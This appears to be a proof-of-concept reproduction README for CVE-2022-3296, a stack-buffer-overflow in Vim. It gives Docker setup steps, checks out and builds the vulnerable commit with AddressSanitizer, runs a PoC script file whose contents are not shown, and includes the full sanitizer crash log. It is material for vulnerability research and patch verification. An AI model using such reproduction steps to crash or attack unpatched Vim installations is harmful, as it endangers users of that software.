### CVE-2022-3296

### PoC Links
[Huntr.dev](https://huntr.dev/bounties/958866b8-526a-4979-9471-39392e0c9077/)

### Docker Container Run Command
```shell
docker build -t cve-2022-3296-poc .
docker run -itd --name CVE-2022-3296-POC cve-2022-3296-poc
docker exec -it CVE-2022-3296-POC /bin/bash
```

### PoC Reproduce Command
```shell
# Preparing the initial environment
apt-get update -y
apt-get install git -y

# Configure local SSH for Github and clone the Vim repository. (ssh-keygen)
cd /poc
git clone git@github.com:vim/vim.git

# Rollback to the vulnerable version.
cd vim/
git reset --hard 5c645a25bb8e6d766db720a44b9ceeff39d1e92b

# Install the compilation and installation dependencies for Vim.
apt install gcc make clang libtool-bin build-essential llvm-dev libunwind-dev -y

# Enter the `src` directory.
cd ./src

# Configure, compile, and install Vim.
./configure --with-features=huge --enable-gui=no --enable-pythoninterp=no CFLAGS="-fsanitize=address -fno-omit-frame-pointer" LDFLAGS="-fsanitize=address"
make
make install

# Open the poc file.
vim -u NONE -i NONE -n -m -X -Z -e -s -S /poc/test -c :qa!
or
ASAN_OPTIONS=detect_leaks=1 vim -u NONE -i NONE -n -m -X -Z -e -s -S /poc/test -c :qa!
```

### Description
Observed that:
```
=================================================================
==9619==ERROR: AddressSanitizer: stack-buffer-overflow on address 0xfffffa5ebfbe at pc 0xaaaab9c5d394 bp 0xfffffa5eb9c0 sp 0xfffffa5eb9d0
READ of size 2 at 0xfffffa5ebfbe thread T0
#0 0xaaaab9c5d390  (/usr/local/bin/vim+0x35d390)
#1 0xaaaab9c207e4  (/usr/local/bin/vim+0x3207e4)
#2 0xaaaab9c15a28  (/usr/local/bin/vim+0x315a28)
#3 0xaaaab9fdb0f8  (/usr/local/bin/vim+0x6db0f8)
#4 0xaaaab9fdc41c  (/usr/local/bin/vim+0x6dc41c)
#5 0xaaaab9fd8a34  (/usr/local/bin/vim+0x6d8a34)
#6 0xaaaab9fd8a90  (/usr/local/bin/vim+0x6d8a90)
#7 0xaaaab9c207e4  (/usr/local/bin/vim+0x3207e4)
#8 0xaaaab9c15a28  (/usr/local/bin/vim+0x315a28)
#9 0xaaaab9c13960  (/usr/local/bin/vim+0x313960)
#10 0xaaaaba320580  (/usr/local/bin/vim+0xa20580)
#11 0xaaaaba31843c  (/usr/local/bin/vim+0xa1843c)
#12 0xaaaaba317b28  (/usr/local/bin/vim+0xa17b28)
#13 0xffff891673f8  (/lib/aarch64-linux-gnu/libc.so.6+0x273f8)
#14 0xffff891674c8 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x274c8)
#15 0xaaaab9a5492c  (/usr/local/bin/vim+0x15492c)

Address 0xfffffa5ebfbe is located in stack of thread T0 at offset 334 in frame
#0 0xaaaab9c139a0  (/usr/local/bin/vim+0x3139a0)

This frame has 6 object(s):
[48, 56) 'cmdline_copy' (line 626)
[80, 88) 'private_msg_list' (line 644)
[112, 136) 'lines_ga' (line 635)
[176, 208) 'cmd_loop_cookie' (line 649)
[240, 304) 'debug_saved' (line 641)
[336, 1920) 'cstack' (line 634) <== Memory access at offset 334 underflows this variable
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
(longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow (/usr/local/bin/vim+0x35d390)
Shadow bytes around the buggy address:
0x200fff4bd7a0: 00 00 00 00 00 00 f3 f3 f3 f3 f3 f3 f3 f3 00 00
0x200fff4bd7b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200fff4bd7c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1
0x200fff4bd7d0: f1 f1 00 00 00 f2 00 00 00 f2 f2 f2 00 00 00 f2
0x200fff4bd7e0: f2 f2 f2 f2 00 00 00 00 f2 f2 f2 f2 00 00 00 00
=>0x200fff4bd7f0: 00 00 00 00 f2 f2 f2[f2]00 00 00 00 00 00 00 00
0x200fff4bd800: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200fff4bd810: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200fff4bd820: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200fff4bd830: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200fff4bd840: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
Addressable:           00
Partially addressable: 01 02 03 04 05 06 07
Heap left redzone:       fa
Freed heap region:       fd
Stack left redzone:      f1
Stack mid redzone:       f2
Stack right redzone:     f3
Stack after return:      f5
Stack use after scope:   f8
Global redzone:          f9
Global init order:       f6
Poisoned by user:        f7
Container overflow:      fc
Array cookie:            ac
Intra object redzone:    bb
ASan internal:           fe
Left alloca redzone:     ca
Right alloca redzone:    cb
Shadow gap:              cc
==9619==ABORTING
```



